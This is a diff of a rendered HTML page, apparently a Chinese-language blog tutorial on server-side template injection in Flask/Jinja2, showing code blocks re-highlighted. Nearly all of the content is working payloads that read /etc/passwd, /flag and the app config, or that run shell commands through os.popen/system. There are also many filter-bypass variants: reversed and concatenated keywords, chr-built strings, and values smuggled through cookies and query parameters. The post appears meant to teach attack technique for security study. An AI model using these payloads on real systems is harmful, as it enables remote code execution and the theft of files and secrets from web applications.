-&#123;&#123;().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">'/etc/passwd'</span>).readlines()&#125;&#125;</code></pre></div>
+<h2 id="读文件payload"><a href="#读文件payload" class="headerlink" title="读文件payload"></a>读文件payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).readlines()&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 
 
 <h2 id="命令执行构造"><a href="#命令执行构造" class="headerlink" title="命令执行构造"></a>命令执行构造</h2><p>在双大括号我们可以执行表达式,但是命名空间是受限的,没有builtins,所以eval,open这些操作是不能使用的,但根据前面的知识,我们可以通过任意一个函数的func_globals而得到他们的命名空间,而得到builtins</p>
 <h2 id="flask内置函数"><a href="#flask内置函数" class="headerlink" title="flask内置函数"></a>flask内置函数</h2><p>这种方法之前好像没人提过</p>
 <p>Flask 内置了两个函数url_for 和 get_flashed_messages,还有一些内置的对象</p>
-<div class="hljs"><pre><code class="hljs clojure">&#123;&#123;url_for.__globals__['__builtins__'].__import__(<span class="hljs-name">'os'</span>).system(<span class="hljs-name">'ls'</span>)&#125;&#125;
-&#123;&#123;request.__init__.__globals__['__builtins__'].open(<span class="hljs-name">'/flag'</span>).read()&#125;&#125;</code></pre></div>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">url_for.__globals__</span>[&#x27;__builtins__&#x27;].__import__(<span class="name">&#x27;os&#x27;</span>).system(<span class="name">&#x27;ls&#x27;</span>)&#125;&#125;</span></span><br><span class="line"><span class="template-variable">&#123;&#123;<span class="name">request.__init__.__globals__</span>[&#x27;__builtins__&#x27;].open(<span class="name">&#x27;/flag&#x27;</span>).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure>
 
 <p>如果过滤了config,又需要查config</p>
-<div class="hljs"><pre><code class="hljs clojure">&#123;&#123;config&#125;&#125;
-&#123;&#123;get_flashed_messages.__globals__['current_app'].config&#125;&#125;</code></pre></div>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">config</span>&#125;&#125;</span></span><br><span class="line"><span class="template-variable">&#123;&#123;<span class="name">get_flashed_messages.__globals__</span>[&#x27;current_app&#x27;].config&#125;&#125;</span></span><br></pre></td></tr></table></figure>
 
 <h2 id="通过基类查找子类"><a href="#通过基类查找子类" class="headerlink" title="通过基类查找子类"></a>通过基类查找子类</h2><p>虽然模块间的变量不共享,但是所有类都是object的子类,所以可以通过object类而得到其他类</p>
 <p>利用</p>
-<div class="hljs"><pre><code class="hljs reasonml">#python2.<span class="hljs-number">7</span>
-''.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__mro__</span>[</span></span><span class="hljs-number">2</span>]
-&#123;&#125;.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>[</span></span><span class="hljs-number">0</span>]
-<span class="hljs-literal">()</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>[</span></span><span class="hljs-number">0</span>]
-<span class="hljs-literal">[]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>[</span></span><span class="hljs-number">0</span>]
-request.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__mro__</span>[</span></span><span class="hljs-number">1</span>]
-#python3.<span class="hljs-number">7</span>
-''.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__mro__</span>[</span></span><span class="hljs-number">1</span>]
-&#123;&#125;.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>[</span></span><span class="hljs-number">0</span>]
-<span class="hljs-literal">()</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>[</span></span><span class="hljs-number">0</span>]
-<span class="hljs-literal">[]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>[</span></span><span class="hljs-number">0</span>]
-<span class="hljs-literal">[]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__base__</span></span></span>
-<span class="hljs-module-access"><span class="hljs-module">(</span></span>).<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__base__</span></span></span>
-<span class="hljs-module-access"><span class="hljs-module">&#123;</span></span>&#125;.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__base__</span></span></span>
-<span class="hljs-module-access"><span class="hljs-module">r</span></span>equest.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__mro__</span>[</span></span><span class="hljs-number">1</span>]
-session.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__mro__</span>[</span></span><span class="hljs-number">1</span>]
-redirect.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__mro__</span>[</span></span><span class="hljs-number">1</span>]</code></pre></div>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#python2.<span class="number">7</span></span><br><span class="line">&#x27;&#x27;.<span class="module-access"><span class="module"><span class="identifier">__class__</span>.</span><span class="module"><span class="identifier">__mro__</span>[</span></span><span class="number">2</span>]</span><br><span class="line">&#123;&#125;.<span class="module-access"><span class="module"><span class="identifier">__class__</span>.</span><span class="module"><span class="identifier">__bases__</span>[</span></span><span class="number">0</span>]</span><br><span class="line"><span class="literal">()</span>.<span class="module-access"><span class="module"><span class="identifier">__class__</span>.</span><span class="module"><span class="identifier">__bases__</span>[</span></span><span class="number">0</span>]</span><br><span class="line"><span class="literal">[]</span>.<span class="module-access"><span class="module"><span class="identifier">__class__</span>.</span><span class="module"><span class="identifier">__bases__</span>[</span></span><span class="number">0</span>]</span><br><span class="line">request.<span class="module-access"><span class="module"><span class="identifier">__class__</span>.</span><span class="module"><span class="identifier">__mro__</span>[</span></span><span class="number">1</span>]</span><br><span class="line">#python3.<span class="number">7</span></span><br><span class="line">&#x27;&#x27;.<span class="module-access"><span class="module"><span class="identifier">__class__</span>.</span><span class="module"><span class="identifier">__mro__</span>[</span></span><span class="number">1</span>]</span><br><span class="line">&#123;&#125;.<span class="module-access"><span class="module"><span class="identifier">__class__</span>.</span><span class="module"><span class="identifier">__bases__</span>[</span></span><span class="number">0</span>]</span><br><span class="line"><span class="literal">()</span>.<span class="module-access"><span class="module"><span class="identifier">__class__</span>.</span><span class="module"><span class="identifier">__bases__</span>[</span></span><span class="number">0</span>]</span><br><span class="line"><span class="literal">[]</span>.<span class="module-access"><span class="module"><span class="identifier">__class__</span>.</span><span class="module"><span class="identifier">__bases__</span>[</span></span><span class="number">0</span>]</span><br><span class="line"><span class="literal">[]</span>.<span class="module-access"><span class="module"><span class="identifier">__class__</span>.</span><span class="module"><span class="identifier">__base__</span></span></span></span><br><span class="line"><span class="module-access"><span class="module">(</span></span>).<span class="module-access"><span class="module"><span class="identifier">__class__</span>.</span><span class="module"><span class="identifier">__base__</span></span></span></span><br><span class="line"><span class="module-access"><span class="module">&#123;</span></span>&#125;.<span class="module-access"><span class="module"><span class="identifier">__class__</span>.</span><span class="module"><span class="identifier">__base__</span></span></span></span><br><span class="line"><span class="module-access"><span class="module">r</span></span>equest.<span class="module-access"><span class="module"><span class="identifier">__class__</span>.</span><span class="module"><span class="identifier">__mro__</span>[</span></span><span class="number">1</span>]</span><br><span class="line">session.<span class="module-access"><span class="module"><span class="identifier">__class__</span>.</span><span class="module"><span class="identifier">__mro__</span>[</span></span><span class="number">1</span>]</span><br><span class="line">redirect.<span class="module-access"><span class="module"><span class="identifier">__class__</span>.</span><span class="module"><span class="identifier">__mro__</span>[</span></span><span class="number">1</span>]</span><br></pre></td></tr></table></figure>
 
 <p>等得到object 对象,然后通过<code>__subclasses__()</code>方法,得到所有子类,在找重载过<code>__inti__,__repr__</code>等特殊方法的类,利用这些方法的<code>__globals__</code>得到,<code>__builtins__</code>,或者<code>os,codecs</code>等可以进行代码执行的调用.</p>
 <p>常见payload</p>
-<div class="hljs"><pre><code class="hljs markdown">// 59 为warnings.WarningMessag
-''.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[<span class="hljs-string">2</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">59</span>].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[<span class="hljs-string">'__builtins__'</span>][<span class="hljs-symbol">'eval'</span>]('<span class="hljs-strong">__import__</span>("os").popen("ls").read()')</code></pre></div>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 59 为warnings.WarningMessag</span></span><br><span class="line">&#x27;&#x27;.<span class="module-access"><span class="module"><span class="identifier">__class__</span>.</span><span class="module"><span class="identifier">__mro__</span>[</span></span><span class="number">2</span>].<span class="constructor">__subclasses__()</span><span class="literal">[<span class="number">59</span>]</span>.<span class="module-access"><span class="module"><span class="identifier">__init__</span>.</span><span class="module"><span class="identifier">__globals__</span>[</span></span>&#x27;__builtins__&#x27;]<span class="literal">[&#x27;<span class="identifier">eval</span>&#x27;]</span>(&#x27;<span class="constructor">__import__(<span class="string">&quot;os&quot;</span>)</span>.popen(<span class="string">&quot;ls&quot;</span>).read<span class="literal">()</span>&#x27;)</span><br></pre></td></tr></table></figure>
 
 <p>不使用globals的payload</p>
-<div class="hljs"><pre><code class="hljs markdown">// <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">class</span> '<span class="hljs-attr">warnings.catch_warnings</span>'&gt;</span></span>类在在内部定义了<span class="hljs-emphasis">_module=sys.modules['warnings']，然后warnings模块包含有_</span><span class="hljs-emphasis">_builtins_</span>_,
-如果可以找到warnings.catch_warnings类,则可以不使用  globals
-
-''.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[<span class="hljs-string">2</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">60</span>](<span class="hljs-link"></span>).<span class="hljs-emphasis">_module._</span><span class="hljs-emphasis">_builtins_</span><span class="hljs-emphasis">_['_</span><span class="hljs-emphasis">_import_</span>_']("os").system("calc")</code></pre></div>
+<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// &lt;class <span class="string">&#x27;warnings.catch_warnings&#x27;</span>&gt;类在在内部定义了<span class="symbol">_module</span>=sys.modules[<span class="string">&#x27;warnings&#x27;</span>]，然后warnings模块包含有<span class="symbol">__builtins__</span>,</span><br><span class="line">如果可以找到warnings.catch_warnings类,则可以不使用  globals</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.<span class="symbol">__class__</span>.<span class="symbol">__mro__</span>[<span class="number">2</span>].<span class="symbol">__subclasses__</span>()[<span class="number">60</span>]().<span class="symbol">_module</span>.<span class="symbol">__builtins__</span>[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;calc&quot;</span>)</span><br></pre></td></tr></table></figure>
 
 <h1 id="0x3-过滤绕过"><a href="#0x3-过滤绕过" class="headerlink" title="0x3 过滤绕过"></a>0x3 过滤绕过</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><ul>
 <li>利用python的魔术方法,也可以实现字典,数组取值等操作</li>
 <li>Jinja2对模板做了特殊处理,所以通过</li>
 </ul>
-<div class="hljs"><pre><code class="hljs css"><span class="hljs-selector-tag">A</span><span class="hljs-selector-attr">[<span class="hljs-string">'__init__'</span>]</span></code></pre></div>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">A</span><span class="selector-attr">[<span class="string">&#x27;__init__&#x27;</span>]</span></span><br></pre></td></tr></table></figure>
 
 <p>也可以访问A的方法,属性</p>
 <ul>
 <li><p>Jinja2 的attr 过滤器可以获得对象的属性或方法</p>
 </li>
 <li><p>flask内置的request对象可以得到请求的信息</p>
-<div class="hljs"><pre><code class="hljs css"><span class="hljs-selector-tag">request</span><span class="hljs-selector-class">.args</span><span class="hljs-selector-class">.name</span>
-<span class="hljs-selector-tag">request</span><span class="hljs-selector-class">.cookies</span><span class="hljs-selector-class">.name</span>
-<span class="hljs-selector-tag">request</span><span class="hljs-selector-class">.headers</span><span class="hljs-selector-class">.name</span>
-<span class="hljs-selector-tag">request</span><span class="hljs-selector-class">.values</span><span class="hljs-selector-class">.name</span>
-<span class="hljs-selector-tag">request</span><span class="hljs-selector-class">.form</span><span class="hljs-selector-class">.name</span></code></pre></div>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">request<span class="selector-class">.args</span>.name</span><br><span class="line">request<span class="selector-class">.cookies</span>.name</span><br><span class="line">request<span class="selector-class">.headers</span>.name</span><br><span class="line">request<span class="selector-class">.values</span>.name</span><br><span class="line">request<span class="selector-class">.form</span>.name</span><br></pre></td></tr></table></figure>
 
 </li>
 </ul>
 <h2 id="关键字过滤"><a href="#关键字过滤" class="headerlink" title="关键字过滤"></a>关键字过滤</h2><h3 id="没过滤引号"><a href="#没过滤引号" class="headerlink" title="没过滤引号"></a>没过滤引号</h3><ul>
 <li>如果没用过滤引号,使用反转,或者各种拼接绕过</li>
 </ul>
-<div class="hljs"><pre><code class="hljs markdown">&#123;&#123;''.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[<span class="hljs-string">1</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">59</span>].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[<span class="hljs-string">'__snitliub__'[::-1</span>]][<span class="hljs-string">'eval'</span>](<span class="hljs-link">'__import__("os"</span>).popen("ls").read()')&#125;&#125;
-
-&#123;&#123;''.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[<span class="hljs-string">1</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">59</span>].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[<span class="hljs-string">'__buil'+'tins__'[::-1</span>]][<span class="hljs-string">'eval'</span>](<span class="hljs-link">'__import__("os"</span>).popen("ls").read()')&#125;&#125;</code></pre></div>
+<figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[&#x27;__snitliub__&#x27;[<span class="symbol">::-1</span>]][&#x27;eval&#x27;](<span class="name">&#x27;__import__</span>(<span class="string">&quot;os&quot;</span>).popen(<span class="string">&quot;ls&quot;</span>).read()&#x27;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[&#x27;__buil&#x27;+&#x27;tins__&#x27;[<span class="symbol">::-1</span>]][&#x27;eval&#x27;](<span class="name">&#x27;__import__</span>(<span class="string">&quot;os&quot;</span>).popen(<span class="string">&quot;ls&quot;</span>).read()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <h3 id="过滤了引号"><a href="#过滤了引号" class="headerlink" title="过滤了引号"></a>过滤了引号</h3><ul>
 <li>利用将需要的变量放在请求中,然后通过[],或者通过<code>attr</code>,<code>__getattribute__</code>获得</li>
 </ul>
-<div class="hljs"><pre><code class="hljs markdown">// url?a=eval
-''.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[<span class="hljs-string">2</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">59</span>].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>.<span class="hljs-strong">__builtins__</span>.[<span class="hljs-string">request.args.a</span>](<span class="hljs-link">'__import__("os"</span>).popen("ls").read()')
-
-// Cookie: aa=<span class="hljs-strong">__class__</span>;bb=<span class="hljs-strong">__mro__</span>;cc=<span class="hljs-strong">__subclasses__</span>
-&#123;&#123;((request|attr(request.cookies.get('aa'))|attr(request.cookies.get('bb'))|list).pop(-1))|attr(request.cookies.get('cc'))()&#125;&#125;</code></pre></div>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">// url?a=eval</span></span><br><span class="line"><span class="xml">&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.__builtins__.[request.args.a](&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="xml">// Cookie: aa=__class__;bb=__mro__;cc=__subclasses__</span></span><br><span class="line"><span class="template-variable">&#123;&#123;((<span class="name">request</span>|attr(<span class="name">request.cookies.get</span>(<span class="name">&#x27;aa&#x27;</span>))|attr(<span class="name">request.cookies.get</span>(<span class="name">&#x27;bb&#x27;</span>))|list).pop(<span class="name">-1</span>))|attr(<span class="name">request.cookies.get</span>(<span class="name">&#x27;cc&#x27;</span>))()&#125;&#125;</span></span><br></pre></td></tr></table></figure>
 
 <ul>
 <li><p>如果request被ban,可以考虑通过</p>
-<div class="hljs"><pre><code class="hljs clojure">&#123;&#123;(<span class="hljs-name">config.__str__</span>()[<span class="hljs-number">2</span>])+(<span class="hljs-name">config.__str__</span>()[<span class="hljs-number">3</span>])&#125;&#125;</code></pre></div>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;(<span class="name">config.__str__</span>()[2])+(<span class="name">config.__str__</span>()[3])&#125;&#125;</span></span><br></pre></td></tr></table></figure>
 
 <p>拼接需要的字符</p>
 </li>
 <li><p>查出chr函数,利用set赋值,然后使用</p>
 </li>
 </ul>
-<div class="hljs"><pre><code class="hljs hy">&#123;% set chr=().__class__.__bases__.__getitem__(<span class="hljs-number">0</span>).__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(<span class="hljs-number">0</span>).__subclasses__().pop(<span class="hljs-number">40</span>)(<span class="hljs-name"><span class="hljs-builtin-name">chr</span></span>(<span class="hljs-number">47</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">101</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">116</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">99</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">47</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">112</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">97</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">115</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">115</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">119</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">100</span>)).read() &#125;&#125;</code></pre></div>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;</span><span class="template-variable">&#123;&#123; ()<span class="name">.__class__.__bases__.__getitem__</span>(<span class="name">0</span>).__subclasses__().pop(<span class="name">40</span>)(<span class="name">chr</span>(<span class="name">47</span>)%<span class="number">2</span>bchr(<span class="name">101</span>)%<span class="number">2</span>bchr(<span class="name">116</span>)%<span class="number">2</span>bchr(<span class="name">99</span>)%<span class="number">2</span>bchr(<span class="name">47</span>)%<span class="number">2</span>bchr(<span class="name">112</span>)%<span class="number">2</span>bchr(<span class="name">97</span>)%<span class="number">2</span>bchr(<span class="name">115</span>)%<span class="number">2</span>bchr(<span class="name">115</span>)%<span class="number">2</span>bchr(<span class="name">119</span>)%<span class="number">2</span>bchr(<span class="name">100</span>)).read() &#125;&#125;</span></span><br></pre></td></tr></table></figure>
 
 <ul>
 <li>利用内置过滤器拼接出,’%c’,再利用’’%语法得到任意字符</li>
 </ul>
-<div class="hljs"><pre><code class="hljs twig"><span class="xml">get %</span>
-<span class="xml">找到特殊字符<span class="hljs-tag">&lt;<span class="hljs-name">,url编码,得到%</span></span></span>
-<span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> pc = g|<span class="hljs-keyword">lower</span>|list|<span class="hljs-keyword">first</span>|urlencode|<span class="hljs-keyword">first</span>%&#125;</span>
-
-
-<span class="xml">get 'c'</span>
-
-<span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> c=dict(c=1).keys()|<span class="hljs-keyword">reverse</span>|<span class="hljs-keyword">first</span>%&#125;</span>
-
-<span class="xml">字符串拼接</span>
-
-<span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> udl=dict(a=pc,c=c).values()|<span class="hljs-keyword">join</span> %&#125;</span>
-
-<span class="xml">可以得到任意字符了</span>
-
-<span class="xml">get _</span>
-<span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> udl2=udl%(95)%&#125;</span><span class="hljs-template-variable">&#123;&#123;udl&#125;&#125;</span></code></pre></div>
+<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">get %</span></span><br><span class="line"><span class="xml">找到特殊字符&lt;,url编码,得到%</span></span><br><span class="line"><span class="template-tag">&#123;%<span class="name"><span class="keyword">set</span></span> pc = g|<span class="keyword">lower</span>|list|<span class="keyword">first</span>|urlencode|<span class="keyword">first</span>%&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="xml">get &#x27;c&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="template-tag">&#123;%<span class="name"><span class="keyword">set</span></span> c=dict(c=1).keys()|<span class="keyword">reverse</span>|<span class="keyword">first</span>%&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">字符串拼接</span></span><br><span class="line"></span><br><span class="line"><span class="template-tag">&#123;%<span class="name"><span class="keyword">set</span></span> udl=dict(a=pc,c=c).values()|<span class="keyword">join</span> %&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">可以得到任意字符了</span></span><br><span class="line"></span><br><span class="line"><span class="xml">get _</span></span><br><span class="line"><span class="template-tag">&#123;%<span class="name"><span class="keyword">set</span></span> udl2=udl%(95)%&#125;</span><span class="template-variable">&#123;&#123;udl&#125;&#125;</span></span><br></pre></td></tr></table></figure>
 
 <h3 id="特殊字符过滤"><a href="#特殊字符过滤" class="headerlink" title="特殊字符过滤"></a>特殊字符过滤</h3><p>其他奇奇怪怪的过滤,善用Flask/Jinja2的文档,用内置过滤器,函数,变量,魔术方法等绕过</p>
 <p>如果是替换为空，可以尝试双写绕过，或者使用黑名单逻辑漏洞错误绕过，即使用黑名单最后一个关键字替换绕过</p>
@@ -492,122 +312,81 @@ redirect.<span class="hljs-module-access"><span class="hljs-module"><span class=
 <li>拼接字符绕过</li>
 </ul>
 <p>这里以过滤class为例子，用中括号括起来然后里面用引号连接，可以用<code>+</code>号或者不用</p>
-<div class="hljs"><pre><code class="hljs python">&#123;&#123;()[<span class="hljs-string">'__cla'</span>+<span class="hljs-string">'ss__'</span>].__bases__[<span class="hljs-number">0</span>]&#125;&#125;
-&#123;&#123;()[<span class="hljs-string">'__cla'</span><span class="hljs-string">'ss__'</span>].__bases__[<span class="hljs-number">0</span>]&#125;&#125;</code></pre></div>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&#x27;__cla&#x27;</span>+<span class="string">&#x27;ss__&#x27;</span>].__bases__[<span class="number">0</span>]&#125;&#125;</span><br><span class="line">&#123;&#123;()[<span class="string">&#x27;__cla&#x27;</span><span class="string">&#x27;ss__&#x27;</span>].__bases__[<span class="number">0</span>]&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>随便写个payload如下</p>
-<div class="hljs"><pre><code class="hljs python">&#123;&#123;()[<span class="hljs-string">'__cla'</span><span class="hljs-string">'ss__'</span>].__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">40</span>].__init__.__globals__[<span class="hljs-string">'__builtins__'</span>][<span class="hljs-string">'ev'</span><span class="hljs-string">'al'</span>](<span class="hljs-string">"__im"</span><span class="hljs-string">"port__('o''s').po"</span><span class="hljs-string">"pen('whoami').read()"</span>)&#125;&#125;</code></pre></div>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&#x27;__cla&#x27;</span><span class="string">&#x27;ss__&#x27;</span>].__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;ev&#x27;</span><span class="string">&#x27;al&#x27;</span>](<span class="string">&quot;__im&quot;</span><span class="string">&quot;port__(&#x27;o&#x27;&#x27;s&#x27;).po&quot;</span><span class="string">&quot;pen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>或者可以使用join来进行拼接</p>
-<div class="hljs"><pre><code class="hljs python">&#123;&#123;()|attr([<span class="hljs-string">"_"</span>*<span class="hljs-number">2</span>,<span class="hljs-string">"cla"</span>,<span class="hljs-string">"ss"</span>,<span class="hljs-string">"_"</span>*<span class="hljs-number">2</span>]|join)&#125;&#125;</code></pre></div>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr([<span class="string">&quot;_&quot;</span>*<span class="number">2</span>,<span class="string">&quot;cla&quot;</span>,<span class="string">&quot;ss&quot;</span>,<span class="string">&quot;_&quot;</span>*<span class="number">2</span>]|join)&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <ul>
 <li>使用使用<code>str</code>原生函数</li>
 </ul>
 <p><code>replace</code>绕过，payload如下</p>
-<div class="hljs"><pre><code class="hljs python">&#123;&#123;().__getattribute__(<span class="hljs-string">'__claAss__'</span>.replace(<span class="hljs-string">"A"</span>,<span class="hljs-string">""</span>)).__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">376</span>].__init__.__globals__[<span class="hljs-string">'popen'</span>](<span class="hljs-string">'whoami'</span>).read()&#125;&#125;
-复制代码</code></pre></div>
